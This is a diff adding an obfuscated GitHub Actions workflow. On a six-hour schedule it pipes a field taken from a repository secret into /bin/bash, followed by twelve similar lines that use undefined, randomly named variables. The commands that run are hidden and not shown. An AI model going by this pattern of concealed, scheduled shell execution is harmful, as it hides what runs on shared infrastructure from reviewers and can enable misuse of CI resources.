@@ -1,0 +1,30 @@
+name: xinjianbox
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinjianbox
+        env:
+          yivbe40: ${{ secrets.yivbe40 }}
+        run: |
+          echo $yivbe40 | jq -r .ldq753 | /bin/bash
+          echo $b13 | jq -r .un99481 | /bin/bash
+          echo $h6647 | jq -r .vfpv6847 | /bin/bash
+          echo $usy418 | jq -r .wjszp360 | /bin/bash
+          echo $td3 | jq -r .yl00232 | /bin/bash
+          echo $q28586 | jq -r .s4295 | /bin/bash
+          echo $do79218 | jq -r .m7 | /bin/bash
+          echo $cnym34 | jq -r .mn5 | /bin/bash
+          echo $xvxb55980 | jq -r .r5931 | /bin/bash
+          echo $xtn3643 | jq -r .l985 | /bin/bash
+          echo $zoth613 | jq -r .elm757 | /bin/bash
+          echo $ixh4780 | jq -r .qqmbi343 | /bin/bash
+          echo $rh92 | jq -r .w9998 | /bin/bash
+
